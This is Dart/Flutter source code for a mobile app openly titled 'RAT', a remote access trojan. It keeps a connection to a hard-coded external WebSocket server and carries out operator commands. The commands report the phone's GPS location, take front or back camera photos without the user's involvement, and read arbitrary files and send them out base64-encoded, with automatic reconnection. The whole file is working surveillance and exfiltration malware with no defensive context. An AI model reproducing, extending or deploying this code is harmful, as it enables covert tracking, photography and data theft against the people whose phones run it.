// ignore_for_file: use_build_context_synchronously, avoid_print

import 'dart:convert';
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;

late WebSocketChannel channel;
bool isConnected = false;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(
    MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'RAT',
      theme: ThemeData.dark(),

      home: Scaffold(
        appBar: AppBar(
          title: Text(
            "RAT",
            style: TextStyle(
              fontSize: 24,
              fontWeight: FontWeight.bold,
              fontFamily: "Courier",
            ),
          ),
          centerTitle: true,
        ),
        body: Center(
          child: Text(
            "RAT running...",
            style: TextStyle(
              fontSize: 24,
              fontWeight: FontWeight.bold,
              fontFamily: "Courier",
            ),
          ),
        ),
        floatingActionButton: FloatingActionButton(
          onPressed: () {
            connectToWebSocket();
          },
          child: Icon(Icons.refresh),
        ),
      ),
    ),
  );
  Geolocator.requestPermission();
  Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high)
      .then((position) {
        print("Current Position: ${position.latitude}, ${position.longitude}");
      })
      .catchError((e) {
        print("Error getting location: $e");
      });
  connectToWebSocket();
}

void connectToWebSocket() async {
  const serverUrl =
      'wss://websocket-server-2eur.onrender.com'; // Replace with your server URL
  if (isConnected) {
    print("Already connected to $serverUrl");
    return;
  }
  try {
    Geolocator.requestPermission();
    Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high)
        .then((position) {
          print(
            "Current Position: ${position.latitude}, ${position.longitude}",
          );
        })
        .catchError((e) {
          print("Error getting location: $e");
        });
    channel = WebSocketChannel.connect(Uri.parse(serverUrl));
    isConnected = true;
    print("✅ Connected to $serverUrl");
    channel.sink.add(jsonEncode({"type": "IDENTIFY", "role": "MOBILE"}));

    channel.stream.listen(
      (message) async {
        print("📩 Received command: $message");

        final data = jsonDecode(message);
        if (data['type'] == "ERROR" && data['command'] == null) {
          print("❌ Invalid message ");
        } else if (data['type'] == "INFO" && data['command'] == null) {
          // channel.sink.add(jsonEncode({"type": "IDENTIFY", "role": "MOBILE"}));
        } else {
          final type = data['type'];

          print("📩 Received command: ${data['command']}");
          final command = data['command'];
          // ignore: prefer_interpolation_to_compose_strings
          print(type + ':' + command);
          await handleCommand(command);
        }
      },
      onDone: () async {
        isConnected = false;
        print("❌ Disconnected. Retrying...");
        await Future.delayed(const Duration(seconds: 5));
        connectToWebSocket();
      },
      onError: (e) async {
        isConnected = false;
        print("❌ Error: $e. Retrying...");
        await Future.delayed(const Duration(seconds: 5));
        connectToWebSocket();
      },
    );
  } catch (e) {
    print("❌ Connection failed: $e. Retrying...");
    await Future.delayed(const Duration(seconds: 5));
    connectToWebSocket();
  }
}

Future<void> handleCommand(String command) async {
  if (command.isEmpty) return;
  if (!isConnected) return;

  print("📩 Handling command: $command");
  if (command == "PING") {
    // channel.sink.add("PONG");
    final response = {"type": "RESPONSE", "data": "OK", "to": "ADMIN"};
    channel.sink.add(jsonEncode(response));
  } else if (command == "GET_LOCATION") {
    Position pos = await Geolocator.getCurrentPosition();
    print("📍 Location: ${pos.latitude}, ${pos.longitude}");
    final response = {
      "type": "RESPONSE",
      "data": "Location: ${pos.latitude},${pos.longitude}",
      "to": "ADMIN",
    };
    channel.sink.add(jsonEncode(response));
  } else if (command == "CAPTURE_FRONT") {
    await captureCamera(CameraLensDirection.front);
  } else if (command == "CAPTURE_BACK") {
    await captureCamera(CameraLensDirection.back);
  } else if (command.startsWith("SEND_FILE:")) {
    final path = command.split(":")[1];
    await sendFile(path, "FILE");
  }
}

Future<void> captureCamera(CameraLensDirection direction) async {
  try {
    final cameras = await availableCameras();
    final selectedCamera = cameras.firstWhere(
      (cam) => cam.lensDirection == direction,
    );

    final controller = CameraController(
      selectedCamera,
      ResolutionPreset.medium,
    );
    await controller.initialize();

    final tempPic = await controller.takePicture();

    final dir = await getApplicationDocumentsDirectory();
    final path =
        '${dir.path}/photo_${direction.name}_${DateTime.now().millisecondsSinceEpoch}.jpg';
    final savedFile = await File(tempPic.path).copy(path);

    await sendFile(savedFile.path, "PHOTO");
    controller.dispose();
  } catch (e) {
    print("❌ Camera capture error: $e");
  }
}

Future<void> sendFile(String path, String type) async {
  final file = File(path);
  if (await file.exists()) {
    final bytes = await file.readAsBytes();
    final base64Data = base64Encode(bytes);
    final filename = path.split('/').last;
    channel.sink.add("$type:$filename:$base64Data");
  } else {
    print("❌ File not found: $path");
  }
}
